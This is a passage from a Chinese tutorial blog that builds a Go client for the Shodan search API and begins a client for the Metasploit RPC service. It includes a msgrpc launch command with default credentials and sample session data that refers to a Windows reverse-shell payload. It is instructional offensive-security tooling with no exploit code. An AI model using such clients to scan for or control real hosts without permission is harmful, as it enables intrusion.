class="function"><span class="keyword">func</span> <span class="title">APIInfo</span><span class="params">(token, url <span class="type">string</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HostSearch</span><span class="params">(token, url <span class="type">string</span>)</span></span></span><br></pre></td></tr></table></figure><p>因此，我们选择一种更为常用的方法，先创建一个<code>shodan.go</code>文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Shodan</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> BaseURL = <span class="string">&quot;http://api.shodan.io&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Client <span class="keyword">struct</span> &#123;</span><br><span class="line">apiKey <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(apikey <span class="type">string</span>)</span></span> *Client  &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;Client&#123;apikey: apikey&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Shodan URL 被定义为一个常见值，这样我们在实现函数中重用它，</p><p>由于这些是结构体<code>Client</code>上的方法，因此可以通过<code>s.apiKey</code>去检索<code>API</code>密钥，并且通过<code>BaseURL</code>去检索<code>URL</code></p><h3 id="2-查询Shodan-订阅情况"><a href="#2-查询Shodan-订阅情况" class="headerlink" title="2. 查询Shodan 订阅情况"></a>2. 查询Shodan 订阅情况</h3><p>现在，开始与<code>Shodan</code>进行互动，根据<code>API</code>文档，用于查询信息的调用如下</p><blockquote><p>shodan 文档：<a href="https://developer.shodan.io/api">https://developer.shodan.io/api</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.shodan.io/api-info?key=&#123;YOUR_API_KEY&#125;</span><br></pre></td></tr></table></figure><p>返回信息是如下的格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;scan_credits&quot;</span><span class="punctuation">:</span> <span class="number">100000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;usage_limits&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;scan_credits&quot;</span><span class="punctuation">:</span> <span class="number">-1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;query_credits&quot;</span><span class="punctuation">:</span> <span class="number">-1</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;monitored_ips&quot;</span><span class="punctuation">:</span> <span class="number">-1</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;plan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;stream-100&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;https&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;unlocked&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;query_credits&quot;</span><span class="punctuation">:</span> <span class="number">100000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;monitored_ips&quot;</span><span class="punctuation">:</span> <span class="number">19</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;unlocked_left&quot;</span><span class="punctuation">:</span> <span class="number">100000</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;telnet&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>我们首先需要在<code>api.go</code>中定义一个可用于把<code>json</code>响应解组为<code>go</code>结构体的类型，如果缺少这一步，将无法处理或者访问响应正文。</p><p>新建<code>api.go</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Shodan</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> APIInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">QueryCredits <span class="type">int</span>    <span class="string">`json:&quot;query_credits&quot;`</span></span><br><span class="line">ScanCredits  <span class="type">int</span>    <span class="string">`json:&quot;scan_credits&quot;`</span></span><br><span class="line">Telnet       <span class="type">bool</span>   <span class="string">`json:&quot;telnet&quot;`</span></span><br><span class="line">Plan         <span class="type">string</span> <span class="string">`json:&quot;plan&quot;`</span></span><br><span class="line">Https        <span class="type">bool</span>   <span class="string">`json:&quot;https&quot;`</span></span><br><span class="line">Unlocked     <span class="type">bool</span>   <span class="string">`json:&quot;unlocked&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Client)</span></span>APIInfo()(*APIInfo, <span class="type">error</span>)  &#123;</span><br><span class="line">res,err := http.Get(fmt.Sprintf(<span class="string">&quot;%s/api-info?key=%s&quot;</span>,BaseURL,s.apikey))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>,err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ret  APIInfo;</span><br><span class="line"><span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;ret);err != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>,err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;ret,<span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用结构体数据显式调用<code>json</code>元素名称，以确保映射和解析数据</p><p>同时<code>APIInfo</code>发出HTTP的<code>Get</code>请求，，并将响应解码成<code>APIInfo</code>的结构体</p><p>我们在使用这段代码前，还需要使用一个有用的<code>API</code>调用(主机搜索)，将其添加到<code>host.go</code>文件中。</p><blockquote><p>根据API文档，该调用的请求和响应如下</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//api.shodan.io/shodan/host/search?key=&#123;YOUR_API_KEY&#125;&amp;query=&#123;query&#125;&amp;facets=&#123;facets&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">----有删减--------</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;matches&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;product&quot;</span>: <span class="string">&quot;nginx&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hash&quot;</span>: <span class="number">-1609083510</span>,</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: <span class="number">1616761883</span>,</span><br><span class="line">            <span class="string">&quot;org&quot;</span>: <span class="string">&quot;Comcast Business&quot;</span>,</span><br><span class="line">            <span class="string">&quot;isp&quot;</span>: <span class="string">&quot;Comcast Business&quot;</span>,</span><br><span class="line">            <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;tcp&quot;</span>,</span><br><span class="line">            <span class="string">&quot;cpe&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;cpe:/a:igor_sysoev:nginx&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;data&quot;</span>: <span class="string">&quot;HTTP/1.1 400 Bad Request\r\nServer: nginx\r\nDate: Mon, 25 Jan 2021 21:33:48 GMT\r\nContent-Type: text/html\r\nContent-Length: 650\r\nConnection: close\r\n\r\n&quot;</span>,</span><br><span class="line">            <span class="string">&quot;asn&quot;</span>: <span class="string">&quot;AS7922&quot;</span>,</span><br><span class="line">            <span class="string">&quot;port&quot;</span>: <span class="number">443</span>,</span><br><span class="line">            <span class="string">&quot;hostnames&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;three.webapplify.net&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;location&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;city&quot;</span>: <span class="string">&quot;Denver&quot;</span>,</span><br><span class="line">                <span class="string">&quot;region_code&quot;</span>: <span class="string">&quot;CO&quot;</span>,</span><br><span class="line">                <span class="string">&quot;area_code&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;longitude&quot;</span>: <span class="number">-104.9078</span>,</span><br><span class="line">                <span class="string">&quot;country_code3&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;latitude&quot;</span>: <span class="number">39.7301</span>,</span><br><span class="line">                <span class="string">&quot;postal_code&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;dma_code&quot;</span>: <span class="number">751</span>,</span><br><span class="line">                <span class="string">&quot;country_code&quot;</span>: <span class="string">&quot;US&quot;</span>,</span><br><span class="line">                <span class="string">&quot;country_name&quot;</span>: <span class="string">&quot;United States&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2021-01-25T21:33:49.154513&quot;</span>,</span><br><span class="line">            <span class="string">&quot;domains&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;webapplify.net&quot;</span></span><br><span class="line">            ],</span><br><span class="line">         </span><br><span class="line">            <span class="string">&quot;http&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;robots_hash&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;redirects&quot;</span>: [],</span><br><span class="line">                <span class="string">&quot;securitytxt&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;title&quot;</span>: <span class="string">&quot;410 Gone&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sitemap_hash&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;robots&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;server&quot;</span>: <span class="string">&quot;nginx/1.4.2&quot;</span>,</span><br><span class="line">                <span class="string">&quot;host&quot;</span>: <span class="string">&quot;185.11.246.51&quot;</span>,</span><br><span class="line">                <span class="string">&quot;html&quot;</span>: <span class="string">&quot;\n\n410 Gone\n\nGone\nThe requested resource/\nis no longer available on this server and there is no forwarding address.\nPlease remove all references to this resource.\n\n&quot;</span>,</span><br><span class="line">                <span class="string">&quot;location&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">                <span class="string">&quot;components&quot;</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">&quot;securitytxt_hash&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;sitemap&quot;</span>: null,</span><br><span class="line">                <span class="string">&quot;html_hash&quot;</span>: <span class="number">922034037</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;os&quot;</span>: null,</span><br><span class="line">            <span class="string">&quot;_shodan&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;crawler&quot;</span>: <span class="string">&quot;c9b639b99e5410a46f656e1508a68f1e6e5d6f99&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ptr&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: <span class="string">&quot;118b7360-01d0-4edb-8ee9-01e411c23e60&quot;</span>,</span><br><span class="line">                <span class="string">&quot;module&quot;</span>: <span class="string">&quot;auto&quot;</span>,</span><br><span class="line">                <span class="string">&quot;options&quot;</span>: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;ip_str&quot;</span>: <span class="string">&quot;185.11.246.51&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        ...</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;facets&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;country&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="string">&quot;count&quot;</span>: <span class="number">1717359</span>,</span><br><span class="line">                <span class="string">&quot;value&quot;</span>: <span class="string">&quot;HK&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;count&quot;</span>: <span class="number">940900</span>,</span><br><span class="line">                <span class="string">&quot;value&quot;</span>: <span class="string">&quot;FR&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;total&quot;</span>: <span class="number">23047224</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的代码是</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Shodan</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HostLocation <span class="keyword">struct</span> &#123;</span><br><span class="line">City         <span class="type">string</span>  <span class="string">`json:&quot;city&quot;`</span></span><br><span class="line">RegionCode   <span class="type">string</span>  <span class="string">`json:&quot;region_code&quot;`</span></span><br><span class="line">AreaCode     <span class="type">int</span>     <span class="string">`json:&quot;area_code&quot;`</span></span><br><span class="line">Longitude    <span class="type">float32</span> <span class="string">`json:&quot;longitude&quot;`</span></span><br><span class="line">CountryCode3 <span class="type">string</span>  <span class="string">`json:&quot;country_code3&quot;`</span></span><br><span class="line">CountryName  <span class="type">string</span>  <span class="string">`json:&quot;country_name&quot;`</span></span><br><span class="line">PostalCode   <span class="type">string</span>  <span class="string">`json:&quot;postal_code&quot;`</span></span><br><span class="line">DMACode      <span class="type">int</span>     <span class="string">`json:&quot;dma_code&quot;`</span></span><br><span class="line">CountryCode  <span class="type">string</span>  <span class="string">`json:&quot;country_code&quot;`</span></span><br><span class="line">Latitude     <span class="type">float32</span> <span class="string">`json:&quot;latitude&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Host <span class="keyword">struct</span> &#123;</span><br><span class="line">OS        <span class="type">string</span>       <span class="string">`json:&quot;os&quot;`</span></span><br><span class="line">Timestamp <span class="type">string</span>       <span class="string">`json:&quot;timestamp&quot;`</span></span><br><span class="line">ISP       <span class="type">string</span>       <span class="string">`json:&quot;isp&quot;`</span></span><br><span class="line">ASN       <span class="type">string</span>       <span class="string">`json:&quot;asn&quot;`</span></span><br><span class="line">Hostnames []<span class="type">string</span>     <span class="string">`json:&quot;hostnames&quot;`</span></span><br><span class="line">Location  HostLocation <span class="string">`json:&quot;location&quot;`</span></span><br><span class="line">IP        <span class="type">int64</span>        <span class="string">`json:&quot;ip&quot;`</span></span><br><span class="line">Domains   []<span class="type">string</span>     <span class="string">`json:&quot;domains&quot;`</span></span><br><span class="line">Org       <span class="type">string</span>       <span class="string">`json:&quot;org&quot;`</span></span><br><span class="line">Data      <span class="type">string</span>       <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">Port      <span class="type">int</span>          <span class="string">`json:&quot;port&quot;`</span></span><br><span class="line">IPString  <span class="type">string</span>       <span class="string">`json:&quot;ip_str&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HostSearch <span class="keyword">struct</span> &#123;</span><br><span class="line">Matches []Host <span class="string">`json:&quot;matches&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Client)</span></span> HostSearch(q <span class="type">string</span>) (*HostSearch, <span class="type">error</span>) &#123;</span><br><span class="line">res, err := http.Get(</span><br><span class="line">fmt.Sprintf(<span class="string">&quot;%s/shodan/host/search?key=%s&amp;query=%s&quot;</span>, BaseURL, s.apiKey, q),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> res.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ret HostSearch</span><br><span class="line"><span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;ret); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;ret, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>HostSearch：用于解析<code>matches</code>数组</li><li>Host：表示matches的一个元素</li><li>HostLocation：表示主机中的<code>location</code>字段</li></ul><p>接下来，我们创建main函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;Test1/Shodan&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">2</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Usage: main &lt;searchterm&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">apiKey := os.Getenv(<span class="string">&quot;SHODAN_API_KEY&quot;</span>)</span><br><span class="line">s := Shodan.New(apiKey)</span><br><span class="line">info, err := s.APIInfo()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(</span><br><span class="line"><span class="string">&quot;Query Credits: %d\nScan Credits:  %d\n\n&quot;</span>,</span><br><span class="line">info.QueryCredits,</span><br><span class="line">info.ScanCredits)</span><br><span class="line"></span><br><span class="line">hostSearch, err := s.HostSearch(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, host := <span class="keyword">range</span> hostSearch.Matches &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%18s%8d\n&quot;</span>, host.IPString, host.Port)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们输入<code>go run main.go Tomcat</code>的时候，便可以查询</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301213245.png"></p><p>OK，一个调用<code>Shodan API</code>的小型 go程序就完成了</p><h2 id="0x03-与Metasploit交互"><a href="#0x03-与Metasploit交互" class="headerlink" title="0x03 与Metasploit交互"></a>0x03 与Metasploit交互</h2><p>msf 想必都熟悉，在这里，我们将会构建一个与远程<code>Metasploit</code>实例进行交互的客户端，他要比<code>Shodan</code>更复杂</p><p>后来改成如下的启动方式了，(图片请忽略)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load msgrpc ServerHost=127.0.0.1 ServerPort=55553 User=<span class="string">&#x27;msf&#x27;</span> Pass=<span class="string">&#x27;msf</span></span><br></pre></td></tr></table></figure><p>书上让本地启动 <code>msfconsole</code>和 <code>msgrpc</code>，这里，我选择使用<code>kali</code>进行替代</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301220321.png"></p><p>书上说为了保险，避免对一些值进行硬编码，需要将以下值设置到环境变量中去，但是这里为了方便，我就先不设置了。</p><p><code>export MSFHOST xxxxxxxx</code></p><p><code>export MSFPASS xxxxxx</code></p><p>现在如图上方，我们已经运行了<code>MSF 和 RPC</code>的服务器，接下来，我们查看<code>MSF API</code>的开发文档，发现，他与使用<code>JSON</code>交互的<code>Shodan</code>不同，msf使用了<code>MessagePack</code>（一种紧凑而高效的二进制格式）进行通信。但是，由于 go 官方库中不含，所以我们需要下载它</p><p><code> go get gopkg.in/vmihailenco/msgpack.v2</code></p><h3 id="1-定义目标"><a href="#1-定义目标" class="headerlink" title="1. 定义目标"></a>1. 定义目标</h3><p>现在定义一个RPC包，创建<code>msf.go</code>，</p><p>在<code>Metasploit</code>开发人员文档中的方法<code>session.list</code></p><blockquote><p>官方文档：<a href="https://docs.rapid7.com/metasploit/rpc-api/">https://docs.rapid7.com/metasploit/rpc-api/</a></p><p><a href="https://docs.rapid7.com/metasploit/standard-api-methods-reference/">https://docs.rapid7.com/metasploit/standard-api-methods-reference/</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;session.list&quot;</span><span class="punctuation">,</span> <span class="string">&quot;token&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这是最小的目标，它期望接收实现的方法是<code>名称和令牌</code>，<code>token</code>值是一个占位符，由文档可知，这是一个身份认证的令牌，是成功登录<code>RPC</code>服务器发出的，从<code>Metasploit</code>返回的方法<code>session.list</code>响应采用以下格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="string">&quot;1&quot;</span> =&gt; <span class="punctuation">&#123;</span></span><br><span class="line">  &#x27;type&#x27; =&gt; <span class="string">&quot;shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;tunnel_local&quot;</span> =&gt; <span class="string">&quot;192.168.35.149:44444&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;tunnel_peer&quot;</span> =&gt; <span class="string">&quot;192.168.35.149:43886&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;via_exploit&quot;</span> =&gt; <span class="string">&quot;exploit/multi/handler&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;via_payload&quot;</span> =&gt; <span class="string">&quot;payload/windows/shell_reverse_tcp&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;desc&quot;</span> =&gt; <span class="string">&quot;Command shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;info&quot;</span> =&gt; <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;workspace&quot;</span> =&gt; <span class="string">&quot;Project1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;target_host&quot;</span> =&gt; <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;uuid&quot;</span> =&gt; <span class="string">&quot;hjahs9kw&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;exploit_uuid&quot;</span> =&gt; <span class="string">&quot;gcprpj2a&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="string">&quot;routes&quot;</span> =&gt; <span class="punctuation">[</span> <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220301224456.png"></p><p>该响应作为映射返回，<code>Meterpreter</code>会话标识符是关键，而会话的详细信息是值</p><p>现在需要构建 <code>Go</code>数据类型和响应结构体，根据文档，</p><p>请求结构体<code>sessionListReq</code>按照<code>Metasploit 